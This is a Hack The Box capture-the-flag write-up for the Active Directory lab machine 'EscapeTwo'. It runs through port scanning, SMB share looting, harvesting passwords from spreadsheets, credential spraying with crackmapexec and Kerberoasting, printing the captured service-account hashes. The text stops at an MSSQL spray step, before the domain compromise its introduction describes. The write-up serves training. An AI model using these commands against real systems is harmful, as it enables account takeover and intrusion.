# EscapeTwo

![EscapeTwo Complete](https://github.com/het-desai/hackthebox/blob/main/escapetwo/escapetwo.png)

## Introduction

In this write-up, I document the complete compromise of the Hack The Box (HTB) machine EscapeTwo, an Active Directory-focused Windows box. The assessment involved deep enumeration, SMB share access using provided credentials, file extraction and credential harvesting from Excel documents, and pivoting through low-privileged users via SQL Server misconfigurations and WinRM. Eventually, the path to domain dominance was achieved through advanced AD techniques, including Kerberoasting and Shadow Credentials abuse, showcasing a full attack chain from external access to domain-level compromise. This exercise not only tested my technical skills across enumeration, exploitation, and privilege escalation but also reinforced my understanding of real-world enterprise attack surfaces.

## Machine Enumeration

Run the Nmap scan and discover the open ports.

```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.11.51                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 15:03 EST
Nmap scan report for 10.10.11.51
Host is up (0.088s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-16 20:04:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-16T20:05:40+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-16T20:05:39+00:00; -1s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-01-16T20:05:40+00:00; -1s from scanner time.
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-16T19:01:27
|_Not valid after:  2055-01-16T19:01:27
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-16T20:05:39+00:00; -2s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-16T20:05:39+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-16T20:05:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.99 seconds
```

Run the Nmap UDP port scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU 10.10.11.51                                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 15:13 EST
Nmap scan report for 10.10.11.51
Host is up (0.065s latency).
Not shown: 996 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds
```

Add a domain name into the `/etc/host` file.

```
┌──(kali㉿kali)-[~]
└─$ tail /etc/hosts -n 1
10.10.11.51	sequel.htb DC01.sequel.htb
```

Given credential (rose:KxEPkKe6R8su) in scenario, use it against SMB port to access directories using `smbmap` tool.

```
┌──(kali㉿kali)-[~]
└─$ sudo smbmap -H 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.51:445	Name: sequel.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Accounting Department                             	READ ONLY	
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
[*] Closed 1 connections
```

The `Accounting Department` looks interesting share as well, as it is not a default share. Check it using the `smbclient` tool.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ smbclient \\\\10.10.11.51\\Accounting\ Department -U 'rose'
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

		6367231 blocks of size 4096. 930492 blocks available
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (93.2 KiloBytes/sec) (average 93.2 KiloBytes/sec)
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (58.1 KiloBytes/sec) (average 75.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ ls -l account*    
-rw-r--r-- 1 kali kali 10217 Apr 16 06:57 accounting_2024.xlsx
-rw-r--r-- 1 kali kali  6780 Apr 16 06:58 accounts.xlsx
```

Tried to open `accounting_2024.xlsx` and `accounts.xlsx` using the `strings` command and the LibreOffice tool. The LibreOffice tool isn't able to repair a file or load a file.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ strings accounts.xlsx
xl/_rels/workbook.xml.rels
LlIh7m
SPd9
FSlj
Jysr
xl/workbook.xml
gQ`E
MBzV
k-j(x
u9W{
xl/theme/theme1.xml
 N1,
H=|E
$yFcE
-De)
$?I<E
RUiB
xl/styles.xml
2Uk*M
J3)"<9
!"#\
#'w!3
Rluf
/I^<N
y'6`
(mkd
0|J9
`WD&
hf43
xl/worksheets/_rels/sheet1.xml.rels
>} u
dmbfu
CrXj
xl/worksheets/sheet1.xml
oGdl{	
Y(zK
?H"3
#?z{
m4yg
^zYe
62l'
xtxt
Zwh'
$l[<d
xl/sharedStrings.xml
fnOM
fg'U
fU";T
rNBg\
Q*\H
&?4'
_rels/.rels
0&K^
qy/6
8GRoC*r
r]Uw2
Mmk5nI
0gt{M#}HL
docProps/core.xml
fO.1
`<g$
jtDG
0Lse
!Ir6
docProps/app.xml
`#.	
(T9y
|/"p
gF;Zew
docProps/custom.xml
, k9
9c.#EoR
o!{m
[Content_Types].xml
;Jm^
$FJe
w#>5
~(5M
7%OSSe
s(T>
v]n 
24pz
xl/_rels/workbook.xml.relsPK
xl/workbook.xmlPK
xl/theme/theme1.xmlPK
xl/styles.xmlPK
xl/worksheets/_rels/sheet1.xml.relsPK
xl/worksheets/sheet1.xmlPK
xl/sharedStrings.xmlPK
_rels/.relsPK
docProps/core.xmlPK
docProps/app.xmlPK
docProps/custom.xmlPK
[Content_Types].xmlPK
```

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ strings accounting_2024.xlsx 
[Content_Types].xml 
}'fQU
&YB@
YO$`
b.j"
Q23V$
_rels/.rels 
BKwAH
GJy(v
USh9i
r:"y_dl
xl/workbook.xml
yfJs)
NPnL
`YHU
!rT]]
F;9_+'c
~}Us
\1(,
hJ*6]
wCg{
=C]e
=<lvt
xl/_rels/workbook.xml.rels 
&!3~
0u2js
xl/worksheets/sheet1.xml
eC{Bfoa
]-[7
JIKa
&L2a
%V#?
JvDJ
Qz?M
i~+5
662jt
`jR	
4"xz[av
xl/theme/theme1.xml
81l%E
nEr,P
JZZtl'
we-@R
!,cy
QJ0M
r*;L
'(m\+
ZsukN
Ak+K
XobX
iFF8
wO@!
;8u\
dPMgA
$}:p
"!!0
E\W*
}4oa
4.b?
6]xr
WSFnI
\}DU
&pVf+
,-&'K
?,+p+b
k;mm
_VZ#
(w~UL
?*BFL
a_H@
xl/styles.xml
}9?~
5!Mq`
Hjak
YRie
ACzz
$t:4u
xl/sharedStrings.xmll
|uI;
@|V\^dD
3x`Ce
N9Oq
#(c9
;m2K
xl/worksheets/_rels/sheet1.xml.rels
CS7"
:=RY
xl/printerSettings/printerSettings1.bin
.JS,(
+ZfJ
dhElK#
^[bW
h_tP	:
Q=p%
#6U>p
Xclc
!A~a
[g|)
docProps/core.xml 
FI*~
YJUB
Dt@2
^XUUP
paO~F
docProps/app.xml 
)DLd1
=+MH
0aO8
[Content_Types].xmlPK
_rels/.relsPK
xl/workbook.xmlPK
xl/_rels/workbook.xml.relsPK
xl/worksheets/sheet1.xmlPK
xl/theme/theme1.xmlPK
xl/styles.xmlPK
xl/sharedStrings.xmlPK
;m2K
xl/worksheets/_rels/sheet1.xml.relsPK
xl/printerSettings/printerSettings1.binPK
docProps/core.xmlPK
docProps/app.xmlPK
```

Both `xlsx` files `strings` command output give some file paths at the bottom, such as `xl/workbook.xmlPK`, `xl/theme/theme1.xmlPK`, etc. Let's try to extract the file using the `7z` command.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ mkdir xlsextract                                        
                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ mv account* xlsextract

┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ cd xlsextract

┌──(kali㉿kali)-[~/htb/EscapeTwo/xlsextract]
└─$ 7z e accounts.xlsx 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 6780 bytes (7 KiB)

Extracting archive: accounts.xlsx
WARNING:
accounts.xlsx
The archive is open with offset

--
Path = accounts.xlsx
Warning: The archive is open with offset
Type = zip
Physical Size = 6780

ERROR: Headers Error : xl/_rels/workbook.xml.rels
                                 
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1

┌──(kali㉿kali)-[~/htb/EscapeTwo/xlsextract]
└─$ ls
 accounting_2024.xlsx   app.xml                core.xml     sharedStrings.xml   sheet1.xml.rels   theme1.xml     workbook.xml.rels
 accounts.xlsx         '[Content_Types].xml'   custom.xml   sheet1.xml          styles.xml        workbook.xml
```

After checking all individual extracted file. The `sharedStrings.xml` file is interesting which contains usernames and passwords.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo/xlsextract]
└─$ subl sharedStrings.xml
```

![image.png](https://github.com/het-desai/hackthebox/blob/main/escapetwo/screenshots/image.png)

Before testing credentials, lets find the username using the `nxc` command and then test the usernames against founded credentials using `crackmapexec`.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ sudo nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --users
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.51     445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain 
SMB         10.10.11.51     445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.51     445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account 
SMB         10.10.11.51     445    DC01             michael                       2024-06-08 16:47:37 0        
SMB         10.10.11.51     445    DC01             ryan                          2024-06-08 16:55:45 0        
SMB         10.10.11.51     445    DC01             oscar                         2024-06-08 16:56:36 0        
SMB         10.10.11.51     445    DC01             sql_svc                       2024-06-09 07:58:42 4        
SMB         10.10.11.51     445    DC01             rose                          2024-12-25 14:44:54 0        
SMB         10.10.11.51     445    DC01             ca_svc                        2025-01-17 08:06:25 0        
SMB         10.10.11.51     445    DC01             [*] Enumerated 9 local users: SEQUEL
```

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ crackmapexec smb 10.10.11.51 -u usernames.txt -p passwords.txt --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\rose:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\rose:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\rose:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\rose:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ryan:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ryan:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sql_svc:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sql_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sql_svc:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sql_svc:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sql_svc:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE

┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ crackmapexec smb 10.10.11.51 -u 'oscar' -p '86LxLBMgEWaKUnBG' --shares             
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
SMB         10.10.11.51     445    DC01             [+] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ
```

Test `oscar` username which I founded usernames and passwords against the machine and found a new combination, `oscar:86LxLBMgEWaKUnBG` . Checked SMB shares access of the new user, but it looks like same access which has a `rose` user.

Try to use `oscar:86LxLBMgEWaKUnBG` combination against the WinRM service, but it didn’t give any result.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ crackmapexec winrm 10.10.11.51 -u 'oscar' -p '86LxLBMgEWaKUnBG'                      
SMB         10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
HTTP        10.10.11.51     5985   DC01             [*] http://10.10.11.51:5985/wsman
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\oscar:86LxLBMgEWaKUnBG
```

Test the Kerberoasting method to extract the SPN user’s hash and store it into the `kerberoRose.txt` file, and try to crack it using hashcat, but no success.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.11.51 sequel.htb/rose
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 03:58:42.689521  2025-03-30 10:54:02.921480             
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2025-03-30 18:02:29.218309  2025-03-30 16:14:59.765257             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$683fa0239ccd9cae63754d25b522b9d2$ee7d310901475df01f6c4ba1291ff7c563552b5f35a916aafe67fd6912e0c0cd53ee3c1f82b0d4fc126d8f101cbbb2f0988cc9c451ae974a7ec930a6c8064b7f35aa031c9fa9ce75f108a839dce67a56aac1e32b3a55213c00f8c0e114b5569bc67e7ca70367554f0d558f365695fdb4c7d3b4f53923d6ab689841edabf20143bc37012434676441bf91a5fc88d051835a317e32c6d4fe45504d7deddd1c05a17c65b7217f800a6faa2e718a3d3febd7c832e0416fba242ff91df0dd2a6bcdddd55e8465c7f9b51b12a288616dd7343f3aa8b3d0b2354a0f52deec0dde24aaf10e14383f4f68a41bbb4e8fc93c4f1fca864ca24e40a738de96a7dd6c5af706b2307dad8c01740a70758a50aee8847dfe75321593a6ea7c1e8064cf6d3ab595e5d4db3765a1fbc6134d95322c39a17f7fc7d89df5889892d29a4b1f2a1061a20666fcdcb980babaa884331ebb93691d7cf71f829cf8796f3a2f8c2ba9c2674edbd2d7157552ec35a2174c18c304811011c8e482567444848de5edc3c76e6bec1a2e1ccb03da4c95e65b75fb66503b9565001306bfee1457532f814508bed5a350e0b0bcb16ba882fa6f909ba5f0de661add011d84e1127109fc01f0c43f52b316e8f612f02ba1882d4dd43fca8dc4684c78612b0f74aa09e8eb24bf54310a1e9726ae63e09465966d02b2cdf84f431430d606d913b3697f8c3390c90d6f6faeb53a3eb019722d4b0c5b14e0c887d458bface581e47985ee8aff9ff37812eb700d3a880c41e30ea225c37f710925417950e851a0f356edf2f108eade312a8a58c7af1843451b23c13a0d5cc563114d3954f92274ee7ec674a8fec030893d1e3bd295140206ca0b5a79d21eaf145cc43508a075c7e1e2512c9819094e7494f9a88a97b974fb9f96ba314461506a41be2396eef089066bffbcd6942fe1214cf250e347ffcb21e559f9cbea310e675f1613160ad8810551c828fe7c5955181642e0fe57ea493867f6fbf8d452cdac79eb6fa725ac2a11eddd520fa215b34b1bbd05abddea20e0664a295b8a33b0ddd257ed2e504bf095c2abd125d72ab0b6f3f78ccd4192c401809f730edb1c76de1dd6288e4a34531b2a5b945871b8dd620a6585a1644805d0a4d428520c350469e758bd3dac79aed39b9a56249ba56e869334179a5fc82abc0e013bdf7b000c06a53c4d5a2c57e7dce1046e20be46a39dcce7a999f60ecaac6fd8208a10c850f771f7122b6a536f5e71909bbb69ba708838b2a38c5e0e6491f5db314c43bac17fb45b8b342805cc582223cfa501c59203aa3829b6ce2fb8a23ced57026a395e43aa358de111e96e9648f13c44abfa31b0fc55345ddb544150ba39226037f65fa71107840a1876510ac6764ed557d634eb733d29e2728c8fae59ca27a556731c005a0dbf
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$9dd486e39c0e0191b092d29f7b60da24$12448821ffe8212d413968d558bc56c4db788f6c76f415437b5623c098c490795caffb220f28bf39a8e83557e149df131283ec6a67773628ace0ff00011a35268f3f846d69a2c2c9a2e34b8537a441c8760b06063044d442acc7d8adfe729efb487bdf190f6c7d01a820557305c16fc49c9db152bdf922a819e94d9c4a691b2b8dd840ae8a3adf7513b01ef9878f1140a93e1c7b8d87be3d824a7bba0ecd86725b689029747c3798ad5101f29e1398bdf16ce29cd149d2fa63495839c2e1be9279abd2176a22d275ee784646765426ef441b39c617a1db6dfc6e6f5870165c524af58ab4205060d24e4fd97d39a4bed46abe2e8290973ac8b1be0b5085f4cdec79d9e047b3b0a7e9b7703fe148a25ade9590978fe0334487573c7fb781aca694e908bd2ce07e665413148586fb12ab5168b984e35e1a958b02a77109a55d3219325369bcf2598adc657206ffc328fe9f197bcc1e5e4be786f1a79ff350e41347528b513c8db76ddeea999cca835872c81bec9ba810bb7cc748dc51573bb84839465d5ae5733f1d642460851aaa1cd8ce5d51d9279b4b9e1d0014a4cbb4a4cb9508b0995ce8d52afbb274bc3b4b2a8366f28b9d2740ef894005971ededb13831fab734fdc2a395c7432609fc36fa8427191db3d2d21125a240b74c33f071f64ea08e32843e13c41ade67c38a9c9a297f7574e3e7aafae29fffedc1ec1ea1dc5f3cd3961bce8ba02e63dfb993dd64be5349192cf98069327fb7aa4edea1fc7dd8d7ce27b73fad1a31cd60178845da584d9b4289e8465e0fab49ee4c78af192e466d8da16f7a68f43184d6459bb78666ce99790073cd86847a5b4ffe48bdec058c5754f09d4bd1d8523526ed894cbcd384449c91c8f0ff97dbaf937e90b38db502a2fd0f48ad739cb9a78735b3cbc2b87a99082506489422de7ff0a349ca8218f2d918c399d08b7055cacfb8f711aade7730d55daf5669e09c03d1a758fda6788a08caec2800daef33d0ca3473617e6b50ea46b7959ecf0928fd4b90418fb10ae59427b726f56f48ca8adbc4be94305cf4be0015ec2b671299915ff040988d5956a222160a3b2b4b2be2c723fd71676c0eb10312939253cb4d0d3ea6b09007d719df4b4f44989dc6f0d4c6f056f0ab0a02fac16ab34ccc0b57eb6f235af18b3cedb987c32a78143b5f691ae9eb42e4d2625797bcad81db79e7f2dc99eec58bd520310377b71e62e7e7fae449e545814476837d3454937356e46862b6ea52bee0f8bb8c5e7137f355f2ed94f86804d8340bd687604ad0e7f68db1929cef07666df896bbef672f07edda058b10e48495f77476bd25d62d2110202b764b0f178da9ae130945613a43268ce03abe95d0e7c2c2de9db158caa4b6f0e15e5c92f7390f8512824de7ca0e977daf8c6afa7fcbbd5

┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ cat kerberoRose.txt

┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ hashcat -m 13100 kerberoRose.txt /home/kali/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
...
...
...
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: kerberoRose.txt
Time.Started.....: Wed Apr 16 08:19:35 2025, (16 secs)
Time.Estimated...: Wed Apr 16 08:19:51 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kali/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1816.0 kH/s (0.79ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
Progress.........: 28688768/28688768 (100.00%)
Rejected.........: 0/28688768 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b6d3831303838] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 75%

Started: Wed Apr 16 08:19:35 2025
Stopped: Wed Apr 16 08:19:52 2025
```

Another way to enumerate with username and password combination against other services, such as MS-SQL on port 1433.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ crackmapexec mssql 10.10.11.51 -d 'sequel.htb' -u usernames.txt -p passwords.txt --continue-on-success         
